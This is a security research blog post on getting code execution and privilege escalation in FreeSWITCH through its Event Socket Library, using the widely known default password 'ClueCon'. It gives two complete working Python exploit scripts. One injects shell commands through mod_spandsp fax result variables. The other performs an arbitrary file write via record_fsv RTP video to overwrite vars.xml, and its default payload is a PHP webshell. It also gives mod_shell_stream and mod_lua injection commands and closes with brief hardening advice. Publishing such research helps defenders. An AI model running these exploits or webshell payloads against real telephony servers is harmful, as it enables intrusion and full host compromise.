---
author: Julio
date: 2026-05-17
title: "More Ways to Achieve RCE/Privesc in FreeSWITCH"
image: /assets/images/freeswitch_ways_to_rce.svg
---

<p style="text-align: center"><img src="/assets/images/freeswitch_ways_to_rce.svg" alt="Diagram showing FreeSwitch's exploitation path" width="650"></p>

# More Ways to Achieve RCE/Privesc in FreeSWITCH

## TL;DR

A user with access to FreeSWITCH's Event Socket Library (ESL) has several different ways of achieving RCE. Even if the built-in system commands module is disabled, and even if other modules with more obvious paths to RCE are disabled, there are still ways of getting shell access to the host. ESL listens on port 8021 and is password-protected, but the default password (`ClueCon`) is widely known and many deployments leave it unchanged.

## Introduction

Following my previous post on FreeSWITCH, [Loading Modules From Untrusted Paths to Achieve RCE/Privilege Escalation in FreeSWITCH](https://bulio.io/cves-and-research/loading-modules-for-rce-in-freeswitch/) (which I recommend reading for getting more context on this one), I wanted to explore different paths to RCE and understand the attack surface a bit better. In this post, we will explore built-in features and one unintended way of achieving RCE.

## Faxing The Shell (mod_spandsp)

While auditing [mod_spandsp](https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Modules/mod_spandsp_6587021), FreeSWITCH's fax processing module loaded by default, I looked at what happens at the end of a fax session. The `phase_e_handler` function (`mod_spandsp_fax.c:547`) is the T.30 phase E callback, meaning it fires when a fax transmission completes, whether successfully or not. Inside it, the code reads several channel variables to trigger post-fax actions. At line 695:

```c
if ((var = switch_channel_get_variable(channel, "system_on_fax_result"))) {
    expanded = switch_channel_expand_variables(channel, var);
    switch_system(expanded, SWITCH_FALSE);
```

The value of `system_on_fax_result` is expanded for variable substitutions and passed directly to `switch_system()`, which is a thin wrapper around the OS `system()` call. The same pattern repeats at line 716 for `system_on_fax_failure`. No validation, no filtering. Whatever string is in that channel variable gets executed as a shell command.

Channel variables are set at call origination time through ESL. An attacker with ESL access can originate a call with an arbitrary `system_on_fax_result` value, point it at `rxfax` which will fail immediately on a loopback with no fax tones, and trigger the callback. The following script automates the full chain:

{% raw %}
```python
#!/usr/bin/env python3
# mod_spandsp ESL RCE PoC

import socket
import time

TARGET   = "127.0.0.1"
PORT     = 8021
PASSWORD = "ClueCon"
COMMAND  = "id>/tmp/pwned"

def esl_connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))
    s.settimeout(5)
    return s

def esl_recv(s):
    buf = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf.decode(errors="replace")

def esl_send(s, cmd):
    s.send((cmd + "\n\n").encode())
    time.sleep(1)
    return esl_recv(s)

# Step 1 - connect and authenticate
print("[*] Connecting to ESL...")
s = esl_connect()
banner = esl_recv(s)
print(f"[*] Banner: {banner.strip()}")

resp = esl_send(s, f"auth {PASSWORD}")
if "+OK" not in resp:
    print(f"[-] Auth failed: {resp}")
    s.close()
    exit(1)
print("[+] Authenticated")

# Step 2 - verify mod_spandsp is loaded
print("[*] Checking mod_spandsp...")
resp = esl_send(s, "api show modules")
if "mod_spandsp" not in resp:
    print("[-] mod_spandsp not loaded - aborting")
    s.close()
    exit(1)
print("[+] mod_spandsp is loaded")

# Step 3 - originate loopback call with payload in channel variable
# system_on_fax_result  fires on any completion (success or failure)
# system_on_fax_failure fires specifically on failure (which loopback will trigger)
# rxfax will detect no fax tones and terminate - both vars fire when it does
print(f"[*] Originating fax call with payload: {COMMAND}")
originate_cmd = (
    f"originate {{"
    f"system_on_fax_result={COMMAND},"
    f"system_on_fax_failure={COMMAND}"
    f"}}loopback/1000 "
    f"&rxfax(/tmp/poc.tif)"
)
resp = esl_send(s, f"api {originate_cmd}")
print(f"[*] Originate response: {resp.strip()}")

# Step 4 - wait for rxfax to timeout and trigger spanfax_done()
print("[*] Waiting for rxfax to complete (fax timeout ~30s)...")
time.sleep(35)

print("[!] Done")

s.close()
```
{% endraw %}

Executing this script leads to the following output:

<p style="text-align: center"><img src="/assets/images/fax_exploit1.png" alt="mod_spandsp ESL RCE PoC output" style="width: 750px; border: 1px solid white;"></p>

And we can see RCE was achieved successfully here:

<p style="text-align: center"><img src="/assets/images/fax_exploit2.png" alt="RCE achieved via mod_spandsp" style="width: 750px; border: 1px solid white;"></p>

## Programming Language Modules (mod_lua, mod_python, mod_perl)

FreeSWITCH also offers a few programming language modules that can be used to achieve RCE. Exploiting them, if they're available, is pretty straightforward. As an example, the module [mod_lua](https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Modules/mod_lua_1048944) is built and available to FreeSWITCH by default; it can be loaded with `load mod_lua` if it's not already loaded. If Lua is available on the system, command execution is simple. For example, we can run an inline Lua script like so:

<p style="text-align: center"><img src="/assets/images/lua_exploit1.png" alt="mod_lua inline script execution" style="width: 750px; border: 1px solid white;"></p>

And we can see that the command was successfully executed here:

<p style="text-align: center"><img src="/assets/images/lua_exploit2.png" alt="RCE achieved via mod_lua" style="width: 750px; border: 1px solid white;"></p>

This example uses Lua, but the other modules work pretty much the same and that's why I'm not going to dive deep into them here.

## Streaming Shells (mod_shell_stream)

There are modules that are not available by default in FreeSWITCH, but if you find them in the instance you're testing, they could lead to RCE. One of these modules is `mod_shell_stream`. As the [documentation states](https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Modules/mod_shell_stream_3965515/), _“Mod shell stream is a module to allow you to stream audio from an arbitrary shell command. You could use it to read audio from a database, from a soundcard, etc.”_

Looking at `shell_stream_file_open` in `mod_shell_stream.c`, line 108 shows how the command gets built:

```c
context->command = switch_core_sprintf(handle->memory_pool, "%s -r %d -c %d", path, handle->samplerate, handle->channels);
```

The path argument is whatever follows `shell_stream://` in the URI, interpolated directly into the command string with no sanitization. The module then forks a child, redirects its stdout to a pipe with `dup2(context->fds[1], STDOUT_FILENO)` at line 145, and calls `switch_system(context->command, SWITCH_TRUE)`.

Since the samplerate and channel count get appended automatically, the payload needs a way to discard them. A semicolon followed by `#` does it: the semicolon ends the injected command and the # turns the rest into a shell comment. Redirecting output to a file rather than stdout lets us capture results independently of the audio pipe, which would otherwise just receive garbage.

If the module is available and loaded, we can send `bgapi originate loopback/9198 &playback(shell_stream://id>/tmp/shell_out;#)`. After a few seconds, the file is written with the command output:

<p style="text-align: center"><img src="/assets/images/freeswitch_shell_stream.png" alt="RCE achieved via mod_shell_stream" style="width: 750px; border: 1px solid white;"></p>

## Recording2Shell (Audio Recording -> Variable Overwrite -> RCE)

I was then thinking: what if these modules that have a more obvious path are not present, system commands are disabled, and new module loading is not possible, would an attacker still be able to achieve RCE? Yes, there’s one less obvious path and it's probably the most interesting part of this article - at least it is to me. This one is lengthy, but it's worth it. Trust me.

The `record_fsv` application, part of [mod_fsv](https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Modules/mod_fsv_6587435) and loaded by default, takes a file path as its argument and records an active call, including both audio and video, to that path. The path comes from the dialplan data argument and is passed verbatim to `open()` at line 151, with no sanitization:

```c
fd = open((char *) data, O_WRONLY | O_CREAT | O_TRUNC | O_BINARY, S_IRUSR | S_IWUSR)
```

That already means the write destination is attacker-controlled. The more interesting question is whether we can write something useful. The answer is yes - if we target a file FreeSWITCH itself reads on startup.

The module writes a 184-byte file header first - version, codec name, sample rate, and a microsecond timestamp. After that, audio frames land as `[4 bytes datalen][raw L16 PCM]`. Video is handled by a separate thread, `record_video_thread`, and that is where the file write primitive lives. At lines 87-96:

```c
bytes = read_frame->packetlen | VID_BIT;
write(eh->fd, &bytes, sizeof(bytes));
write(eh->fd, read_frame->packet, read_frame->packetlen);
```

The `read_frame->packet` part is the full RTP packet off the wire - 12-byte header followed by the payload. Both are written to disk verbatim, with zero transformation. Whatever bytes arrive as the RTP payload lands in the file exactly as sent. This is full attacker content control from a predictable offset.

The catch is the binary prefix: the FSV header, any audio frames recorded before the payload frame arrives, and a 4-byte frame size field and a 12-byte RTP header that precede our content. But could we still use it somehow? I thought about parsers that ignore leading binary data and look for a specific payload marker - the same way PHP looks for `<?php ?>` tags. But it’s unlikely that a PHP server will be running. Then, I realized that we could target FreeSWITCH itself by the way its own parser works.

FreeSWITCH reads `vars.xml` on startup to set global configuration variables. The file is processed line by line, looking for `<X-PRE-PROCESS cmd="set" data="variable=value"/>` directives. When it finds one, it sets the variable. Lines containing `<include>` or `</include>` are ignored entirely.

This behavior is what makes the file write exploitable. If the first line of our injected file is `<include>`, the entire line - binary prefix and all - gets discarded. The set directives on the lines that follow are processed normally, including `disable_system_api_commands=false`. FreeSWITCH never sees the binary garbage.

The only remaining constraint is that the binary prefix must not contain `0x3C` (`<`) bytes. If any part of the prefix falls on a line of its own before the `<include>` line, due to a newline byte in the binary header, it would be written to the master configuration document, and a stray `<` there would break the parse entirely. The RTP header fields under attacker control, SSRC, sequence number, and timestamp are fixed to values that avoid `0x3C` through all 60 warmup frames.

That said, I (and Claude Code) came up a script that will act as a server, wait for a connection from FreeSWITCH and start streaming data. I'll break down what the script does first and then I'll add the full version of it at the end.

### Setup

Before anything happens, the script binds a UDP socket on port 5060 and waits. The attacker triggers the attack from ESL with `bgapi originate sofia/external/1000@<LHOST> &record_fsv(/path/to/target)`. That tells FreeSWITCH to call the attacker's machine and record the session to the specified path.

### SIP Handshake

FreeSWITCH sends an INVITE. The script accepts it and responds with a 200 OK containing an SDP (Session Description Protocol) answer that forces the media negotiation to include H264 video. This is critical: `CF_VIDEO` is an internal FreeSWITCH channel flag that gets set once video is negotiated, and `record_fsv` waits for it before opening the output file. Without negotiating video, the file never gets created and the attack fails. Since H264 is in FreeSWITCH's default codec list, no configuration change is needed to negotiate it. Once FreeSWITCH sends ACK, the call is established and two RTP threads start.

### RTP - Three Phases

The audio thread sends PCMU silence continuously to keep the call alive. The video thread does the actual work in three phases:

- **Warm-up:** Sends 60 dummy H264 frames over ~2 seconds. This sets `CF_VIDEO` on the channel, which causes `record_fsv` to open the file and write the 184-byte FSV header. The RTP header values (SSRC, sequence, timestamp) are fixed to values that probably never produce a `0x3C` byte through all 60 frames - necessary because those bytes land in the file and a stray `<` would corrupt any XML target.
- **Injection:** Audio is paused to prevent interleaving. A single RTP packet is sent whose payload is the attacker's content verbatim. FreeSWITCH writes it to disk as `[4 bytes size][12 bytes RTP header][payload]`.
- **Keepalive:** Dummy video frames continue until FreeSWITCH sends BYE, at which point the call tears down cleanly.

### Result

The result is a file that starts with binary garbage - the FSV header, a handful of audio frames, the frame size field, the RTP header - followed immediately by our XML. To make it concrete, the first bytes on disk look something like this:

```text
6A 10 00 00 48 32 36 34 00 00 00 00 ... 41 41 41 41 41 41 0A
3C 58 2D 50 52 45 2D 50 52 4F 43 45 53 53 20 63 6D 64 3D ...
```

The first line is binary: the FSV version number, the codec name "H264" in ASCII, padding, RTP header bytes. The second line, starting at `3C`, is our payload - `3C` is `<`, and from there it reads `<X-PRE-PROCESS cmd="set" data="disable_system_api_commands=false"/>` in plain ASCII. FreeSWITCH wrote both lines identically: raw bytes, no interpretation. One happens to be garbage, the other happens to be valid XML.

That binary garbage is unavoidable, but it does not matter. When FreeSWITCH reads `vars.xml` on the next startup, the preprocessor encounters the first line, which contains `<include>` buried at the end of that binary blob. The entire line gets discarded. The `<X-PRE-PROCESS cmd="set" .../>` directives that follow are clean, on their own lines, and processed normally. FreeSWITCH sets `disable_system_api_commands=false` without ever knowing the file it just read was written by an RTP stream.

### Putting It All Together

To exploit this, we can first issue the `global_getvar` command to get all variables that are currently configured. We see that system commands are disabled:

<p style="text-align: center"><img src="/assets/images/freeswitch_final_rce_1.png" alt="global_getvar output showing system commands disabled" style="width: 750px; border: 1px solid white;"></p>

If we try to run a system command, we will get an error message:

<p style="text-align: center"><img src="/assets/images/freeswitch_final_rce_2.png" alt="System command blocked" style="width: 750px; border: 1px solid white;"></p>

What we will do, however, is overwrite `vars.xml`. The `global_getvar` output gives us the exact variable values the server is running with, so we use it to reconstruct a valid `vars.xml`: copy the output, wrap it in the expected `<X-PRE-PROCESS cmd="set" data="..."/>` directives, and change `disable_system_api_commands=true` to `false` and `disable_system_app_commands=true` to `false`. That file is then passed to the script with the `-f` flag, which embeds it as the RTP payload written to disk.

Once we have our crafted `vars.xml` ready, we can run our script:

<p style="text-align: center"><img src="/assets/images/freeswitch_final_rce_3.png" alt="Running the exploit script" style="width: 750px; border: 1px solid white;"></p>

And we trigger it via ESL:

<p style="text-align: center"><img src="/assets/images/freeswitch_final_rce_4.png" alt="Triggering the exploit via ESL" style="width: 750px; border: 1px solid white;"></p>

The connection was successfully established and data was transferred:

<p style="text-align: center"><img src="/assets/images/freeswitch_final_rce_5.png" alt="Connection established and data transferred" style="width: 750px; border: 1px solid white;"></p>

This is what `vars.xml` looks like now:

<p style="text-align: center"><img src="/assets/images/freeswitch_final_rce_6.png" alt="vars.xml after file write" style="width: 750px; border: 1px solid white;"></p>

All that binary data at the beginning (and also at the end) of the `vars.xml` file is completely ignored by FreeSWITCH when parsing it. Now, all we need to do is restart FreeSWITCH. We can do that by issuing `fsctl shutdown restart` via ESL.

<p style="text-align: center"><img src="/assets/images/freeswitch_final_rce_7.png" alt="Restarting FreeSWITCH via ESL" style="width: 750px; border: 1px solid white;"></p>

And once FreeSWITCH is back on, we have command execution again:

<p style="text-align: center"><img src="/assets/images/freeswitch_final_rce_8.png" alt="Command execution restored after FreeSWITCH restart" style="width: 750px; border: 1px solid white;"></p>


### Full Script/Exploit

```python
#!/usr/bin/env python3
"""
FreeSWITCH mod_fsv - record_fsv arbitrary file write via H264 RTP

Finding (mod_fsv.c:87-101):
    record_video_thread writes raw RTP packets verbatim to disk:
        bytes = read_frame->packetlen | VID_BIT (0x80000000)
        write(fd, &bytes, 4)
        write(fd, read_frame->packet, read_frame->packetlen)

    read_frame->packet = full RTP packet (12-byte header + payload)
    The RTP payload is written with zero transformation.
    Audio and video writes are mutex-protected (same mutex, no race condition).

H264 is in the default codec list - no config change required:
    global_codec_prefs=OPUS,G722,PCMU,PCMA,H264,VP8

Resulting file layout:
    [184 bytes] .fsv file header (version=4202, codec name, rate, µs timestamp)
    [4+N bytes] audio frames: [datalen][raw L16 PCM]   (no RTP header)
    [4+12+P bytes] video frame: [packetlen|0x80000000][RTP header][PAYLOAD]
    ...                                                             ^^^^^^^^^

Usage:
    python3 fsv_write.py <LHOST> [payload|-f file] [SIP_port]

    LHOST   = IP reachable from FreeSWITCH
    payload = string to embed in file (default: PHP webshell)
    -f file = read payload bytes from file
    SIP_port= SIP listen port (default 5060)
"""

import socket, struct, threading, time, random, re, sys

LHOST = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
if len(sys.argv) > 2 and sys.argv[2] == '-f':
    with open(sys.argv[3], 'rb') as _f:
        PAYLOAD = _f.read()
elif len(sys.argv) > 2:
    PAYLOAD = sys.argv[2].encode()
else:
    PAYLOAD = b'<?php system($_GET["c"]); ?>'
SIP_PORT     = int(sys.argv[4]) if len(sys.argv) > 4 else 5060
AUD_RTP_PORT = 12000    # we advertise these in our SDP
VID_RTP_PORT = 12002
AUDIO_PT     = 0        # PCMU - always offered by FreeSWITCH
VIDEO_PT     = 96       # H264 dynamic payload type
SSRC_A       = random.randint(1, 0xFFFFFFFF)   # audio frames write PCM data, not RTP headers
SSRC_V       = 0x41414141                       # fixed: all bytes 0x41, never 0x3C

def rtp(pt, seq, ts, ssrc, payload, marker=False):
    """Build a minimal RTP packet."""
    b1 = (0x80 if marker else 0x00) | (pt & 0x7F)
    hdr = struct.pack('!BBHII', 0x80, b1, seq & 0xFFFF,
                      ts & 0xFFFFFFFF, ssrc)
    return hdr + payload


def stream_audio(ip, port, stop, pause):
    """Send PCMU silence to keep the call alive. Pauses when pause is set."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    seq, ts = random.randint(0, 0xFFFF), random.randint(0, 0xFFFFFFFF)
    silence = b'\xff' * 160     # 160 bytes = 20ms PCMU silence (0xFF = µ-law silence)
    while not stop.is_set():
        if not pause.is_set():
            s.sendto(rtp(AUDIO_PT, seq, ts, SSRC_A, silence), (ip, port))
            seq = (seq + 1) & 0xFFFF
            ts  = (ts  + 160) & 0xFFFFFFFF
        time.sleep(0.02)
    s.close()


def stream_video(ip, port, stop, pause):
    """
    Three-phase video stream.

    Phase 1 - warm-up (~2s):
        Send dummy H264 bytes so FreeSWITCH sets CF_VIDEO on the channel.
        record_fsv waits on CF_VIDEO before opening the file (mod_fsv.c:128-143).
        Without this phase the file never opens and our payload is never recorded.

    Phase 2 - payload injection:
        Audio RTP is paused first so no audio frames land in the file during
        this window (belt-and-suspenders - mod_fsv.c already serialises audio
        and video writes with a shared mutex).
        Single RTP packet whose payload is our arbitrary bytes.
        record_video_thread writes:
            [4 bytes: packetlen | 0x80000000]
            [12 bytes: this RTP header  ← safe bytes, no 0x3C]
            [N bytes: PAYLOAD  ← our bytes, verbatim]

    Phase 3 - keepalive:
        Continue sending video (audio stays paused) until FreeSWITCH sends BYE.

    seq/ts use fixed starting values (0x4141 / 0x41414141) chosen so that
    no byte in any of the 60 warmup RTP headers equals 0x3C ('<').
    See module docstring for the proof.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Fixed starting values - provably avoid 0x3C in all 60 warmup frames.
    seq, ts = 0x4141, 0x41414141

    # Minimal H264 SPS stub - enough for FreeSWITCH to recognise video traffic
    warmup = bytes([0x67, 0x42, 0xe0, 0x1f, 0xda, 0x01])

    # Phase 1 - warm up
    print('[*] Phase 1: warming up video stream (~2s) ...')
    for _ in range(60):     # 60 frames × 33ms ≈ 2 seconds
        s.sendto(rtp(VIDEO_PT, seq, ts, SSRC_V, warmup, marker=True), (ip, port))
        seq = (seq + 1) & 0xFFFF
        ts  = (ts  + 3000) & 0xFFFFFFFF
        time.sleep(0.033)

    # Pause audio before injection to prevent fd write interleaving.
    # FreeSWITCH's record_audio_thread skips CNG frames (SFF_CNG check),
    # so stopping our RTP send is enough to silence the competing writes.
    print('[*] Pausing audio stream to prevent write interleaving ...')
    pause.set()
    time.sleep(0.15)    # drain FreeSWITCH's audio read buffer

    # Phase 2 - inject payload
    print(f'[+] Phase 2: injecting payload ({len(PAYLOAD)} bytes) ...')
    s.sendto(rtp(VIDEO_PT, seq, ts, SSRC_V, PAYLOAD, marker=True), (ip, port))
    print(f'[+] Payload sent - will appear in file as:')
    print(f'    [4B size|VID_BIT][12B RTP header][{PAYLOAD[:40]}...]')
    seq = (seq + 1) & 0xFFFF
    ts  = (ts  + 3000) & 0xFFFFFFFF
    time.sleep(0.3)     # wait for FreeSWITCH to receive and write the frame

    # Phase 3 - keepalive until BYE (audio stays paused - no further race risk)
    print('[*] Phase 3: keepalive ...')
    while not stop.is_set():
        s.sendto(rtp(VIDEO_PT, seq, ts, SSRC_V, warmup, marker=True), (ip, port))
        seq = (seq + 1) & 0xFFFF
        ts  = (ts  + 3000) & 0xFFFFFFFF
        time.sleep(0.033)
    s.close()


def build_sdp():
    return (
        f'v=0\r\n'
        f'o=- 1 1 IN IP4 {LHOST}\r\n'
        f's=-\r\n'
        f'c=IN IP4 {LHOST}\r\n'
        f't=0 0\r\n'
        f'm=audio {AUD_RTP_PORT} RTP/AVP {AUDIO_PT}\r\n'
        f'a=rtpmap:{AUDIO_PT} PCMU/8000\r\n'
        f'a=sendrecv\r\n'
        f'm=video {VID_RTP_PORT} RTP/AVP {VIDEO_PT}\r\n'
        f'a=rtpmap:{VIDEO_PT} H264/90000\r\n'
        f'a=fmtp:{VIDEO_PT} profile-level-id=42e01f;packetization-mode=0\r\n'
        f'a=sendrecv\r\n'
    )

def get_header(msg, name):
    m = re.search(rf'^{name}:\s*(.+)', msg, re.M | re.I)
    return m.group(1).strip() if m else ''


def parse_media_endpoint(sdp, mtype):
    """
    Extract (ip, port) for a given media type.
    Handles both session-level and media-level c= lines.
    """
    session_ip = None
    media_ip   = None
    port       = None
    in_target  = False

    for line in sdp.splitlines():
        line = line.strip()
        if line.startswith('c=IN IP4 ') and not in_target:
            session_ip = line.split()[-1]
        if line.startswith(f'm={mtype} '):
            port      = int(line.split()[1])
            in_target = True
            media_ip  = None
        elif line.startswith('m=') and in_target:
            break
        elif line.startswith('c=IN IP4 ') and in_target:
            media_ip = line.split()[-1]

    return (media_ip or session_ip), port


def run():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', SIP_PORT))

    print('=' * 60)
    print(' FreeSWITCH mod_fsv arbitrary file write PoC')
    print('=' * 60)
    print(f'[*] SIP UA listening on 0.0.0.0:{SIP_PORT}')
    print(f'[*] Audio RTP port : {AUD_RTP_PORT}')
    print(f'[*] Video RTP port : {VID_RTP_PORT}')
    print(f'[*] Payload        : {PAYLOAD[:60]}{"..." if len(PAYLOAD) > 60 else ""}')
    print()
    print('Run this in FreeSWITCH ESL:')
    print(f'  bgapi originate sofia/external/1000@{LHOST}&record_fsv(/path/to/file/to/write)')
    print()

    state = {}
    stop  = threading.Event()

    while True:
        data, addr = sock.recvfrom(8192)
        msg   = data.decode(errors='replace')
        first = msg.split('\r\n')[0]

        if first.startswith('INVITE'):
            print(f'[+] INVITE from {addr[0]}:{addr[1]}')
            state = {
                'call_id':  get_header(msg, 'Call-ID'),
                'via':      get_header(msg, 'Via'),
                'from_hdr': get_header(msg, 'From'),
                'cseq_n':   get_header(msg, 'CSeq').split()[0],
                'to_tag':   hex(random.randint(0, 0xFFFFFF))[2:],
                'aud':      parse_media_endpoint(msg, 'audio'),
                'vid':      parse_media_endpoint(msg, 'video'),
            }
            print(f'[*] FS audio RTP → {state["aud"]}')
            print(f'[*] FS video RTP → {state["vid"]}')

            to_field = f'<sip:fsv@{LHOST}>;tag={state["to_tag"]}'

            # 100 Trying
            sock.sendto((
                f'SIP/2.0 100 Trying\r\n'
                f'Via: {state["via"]}\r\n'
                f'From: {state["from_hdr"]}\r\n'
                f'To: <sip:fsv@{LHOST}>\r\n'
                f'Call-ID: {state["call_id"]}\r\n'
                f'CSeq: {state["cseq_n"]} INVITE\r\n'
                f'Content-Length: 0\r\n\r\n'
            ).encode(), addr)

            # 200 OK with SDP forcing H264 video
            sdp = build_sdp()
            sock.sendto((
                f'SIP/2.0 200 OK\r\n'
                f'Via: {state["via"]}\r\n'
                f'From: {state["from_hdr"]}\r\n'
                f'To: {to_field}\r\n'
                f'Call-ID: {state["call_id"]}\r\n'
                f'CSeq: {state["cseq_n"]} INVITE\r\n'
                f'Contact: <sip:fsv@{LHOST}:{SIP_PORT}>\r\n'
                f'Content-Type: application/sdp\r\n'
                f'Content-Length: {len(sdp)}\r\n\r\n'
                f'{sdp}'
            ).encode(), addr)

        elif first.startswith('ACK'):
            print('[+] ACK - launching RTP threads')
            aud_ip, aud_port = state['aud']
            vid_ip, vid_port = state['vid']

            if not aud_ip or not vid_ip:
                print('[-] Could not parse RTP endpoints from SDP - aborting')
                break

            pause = threading.Event()
            threading.Thread(target=stream_audio,
                             args=(aud_ip, aud_port, stop, pause),
                             daemon=True).start()
            threading.Thread(target=stream_video,
                             args=(vid_ip, vid_port, stop, pause),
                             daemon=True).start()

        elif first.startswith('BYE'):
            print('[+] BYE - stopping streams and closing')
            stop.set()
            bye_cseq = get_header(msg, 'CSeq').split()[0]
            sock.sendto((
                f'SIP/2.0 200 OK\r\n'
                f'Via: {get_header(msg, "Via")}\r\n'
                f'From: {state["from_hdr"]}\r\n'
                f'To: <sip:fsv@{LHOST}>;tag={state["to_tag"]}\r\n'
                f'Call-ID: {state["call_id"]}\r\n'
                f'CSeq: {bye_cseq} BYE\r\n'
                f'Content-Length: 0\r\n\r\n'
            ).encode(), addr)
            print('[+] Done.')
            break


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    run()
```

## Conclusion

ESL access is code execution. The techniques in this article differ in complexity, but they share the same precondition and the same outcome - and `disable_system_api_commands` doesn't change that. As shown in the Recording2Shell technique, it can be unset by any user with ESL access and the ability to trigger a call recording. It is a configuration flag, not a security boundary.

FreeSWITCH is a powerful platform precisely because it exposes so many hooks - fax callbacks, media recording, audio pipelines, scripting runtimes. Those hooks are features. They're also why restricting individual modules by itself is a losing game. When hardening FreeSWITCH, you should consider: firewall port 8021 and never expose ESL to untrusted networks, replace the default `ClueCon` password, don't run FreeSWITCH as the `root` user, monitor anomalous traffic coming into and out of the FreeSWITCH server, least privilege for file reading and writing, and keep the loaded module list minimal. ESL access should be treated with the same sensitivity as shell access, because the distance between the two is not very large.

This blog post, as well as the previous one on FreeSWITCH modules, isn't meant to be comprehensive. Feel free to do your own research and contribute to documenting FreeSWITCH's attack surface so that we can help those deploying it.

PS: Everything in this article was tested on FreeSWITCH v1.10.12 running as the `root` user.

## References

- [https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Modules/](https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Modules/)
- [https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Client-and-Developer-Interfaces/Event-Socket-Library/](https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Client-and-Developer-Interfaces/Event-Socket-Library/)
